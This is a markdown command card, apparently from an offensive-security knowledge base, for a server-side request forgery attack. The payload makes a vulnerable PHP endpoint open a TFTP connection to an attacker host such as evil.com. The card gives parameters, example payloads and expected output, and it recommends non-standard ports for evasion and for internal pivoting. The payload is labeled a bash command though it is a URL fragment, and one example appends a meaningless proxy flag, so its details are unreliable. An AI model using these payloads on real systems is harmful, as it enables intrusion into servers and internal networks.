---
type: command
executor: bash
data: 'ssrf.php?url=tftp://$_ATTACKER_HOST:$_ATTACKER_PORT/$_FILENAME'
tags:
  - ssrf
  - tftp
platforms:
  - Linux
  - Web
verified: true
validated: true
---

# send-ssrf-attack-request

## Command

```bash
ssrf.php?url=tftp://$_ATTACKER_HOST:$_ATTACKER_PORT/$_FILENAME
```

## Description

This command uses a PHP script (ssrf.php) to send a crafted HTTP request to a vulnerable web application, embedding a TFTP URL scheme in the 'url' parameter. It exploits SSRF by forcing the server to initiate a TFTP connection to the attacker's controlled server, enabling potential internal pivoting or data capture. Use this in scenarios where the application processes user-supplied URLs without protocol validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_ATTACKER_HOST` | IP address or hostname of the attacker's TFTP server (e.g., evil.com) | Yes |
| `$_ATTACKER_PORT` | Port on which the TFTP server is listening (default TFTP is 69, but custom like 12346 for evasion) | Yes |
| `$_FILENAME` | Arbitrary filename to request via TFTP (e.g., TESTUDPPACKET), which triggers the UDP packet | Yes |
| `url=` | Parameter name for the URL in the vulnerable endpoint (adjust if different) | Yes |

## Examples

### Basic Usage

```bash
ssrf.php?url=tftp://192.168.1.100:12346/testfile
```

### Advanced Usage

```bash
ssrf.php?url=tftp://evil.com:12346/$_INTERNAL_PROBE
```
Use with a proxy: `ssrf.php?url=tftp://evil.com:12346/probe --proxy http://127.0.0.1:8080` (if ssrf.php supports proxy flags).

## Expected Output

The command outputs the HTTP response from the target application, such as:

```
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "data": "resource fetched"}
```

Simultaneously, check your TFTP server for incoming UDP connections:

```
[TFTP] Incoming request from <target_ip>:12346 for file '$_FILENAME'
```

Success is indicated by the server processing the request without errors and your TFTP server logging activity.

## Related

- [[procedures/SSRF-Exploitation-via-TFTP-Protocol]]
- [[tools/atftpd]] (for setting up TFTP server)
